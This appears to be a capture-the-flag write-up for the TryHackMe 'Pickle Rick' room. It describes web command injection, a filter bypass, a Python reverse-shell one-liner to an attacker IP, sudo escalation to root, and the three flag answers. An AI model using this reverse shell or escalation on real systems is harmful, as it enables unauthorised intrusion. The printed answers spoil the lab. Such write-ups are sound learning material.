# TryHackMe: Pickle Rick

> This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

*[Link](https://tryhackme.com/room/picklerick)*

### Recon

See `nikto.log` and `nmap.log` and `gobuster.log`. The index page contained an interesting comment:

```
Note to self, remember username!

Username: R1ckRul3s
```

The `robots.txt` file contained the following:

```
Wubbalubbadubdub
```

This combination was a valid credential for the `login.php` page, where it seemed like there was an opportunity to execute arbitrary system commands. This was the result for entering `ls -al`.

![image](https://user-images.githubusercontent.com/6025224/257642398-f076d75b-4986-4059-835b-0c53eb3f764e.png)


## Checking out the files

There seemed to be some limits imposed on these command executions. I couldn't use `cat`, for example. This command helped me read all files anyway:

```
grep . *
```

## Flag 1: What is the first ingredient that Rick needs?

The grep command revealed the following:

```
Sup3rS3cretPickl3Ingred.txt:mr. meeseek hair
```

This `mr. meeseek hair` was the correct first flag.

## Reverse shell

From `revshells.com` I got the following payload and I started a netcat listener.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.94.92",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

This didn't work. It did after I replaced `python` with `python3`. It got me a working reverse shell:

![image](https://user-images.githubusercontent.com/6025224/257642667-87fcd447-4641-401f-9136-b69bc5a80c29.png)

Interestingly, this shell can even run everything as `root` user:

![image](https://user-images.githubusercontent.com/6025224/257642690-18e1b943-97e1-4f45-b9c0-a577ab50ccc6.png)

I just ran `sudo bash` to act as `root` now.

## Flag 2: What is the second ingredient in Rick’s potion?
```
root@ip-10-10-57-64:/var/www/html# cd /home/rick
cd /home/rick
root@ip-10-10-57-64:/home/rick# ls -al
ls -al
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
root@ip-10-10-57-64:/home/rick# cat "second ingredients"      
cat "second ingredients"
1 jerry tear
```

## Flag 3: What is the last and final ingredient?

```
root@ip-10-10-57-64:/var/www/html# ls /root      
ls /root
3rd.txt  snap
root@ip-10-10-57-64:/var/www/html# cat /root/3rd.txt
cat /root/3rd.txt
3rd ingredients: fleeb juice
```
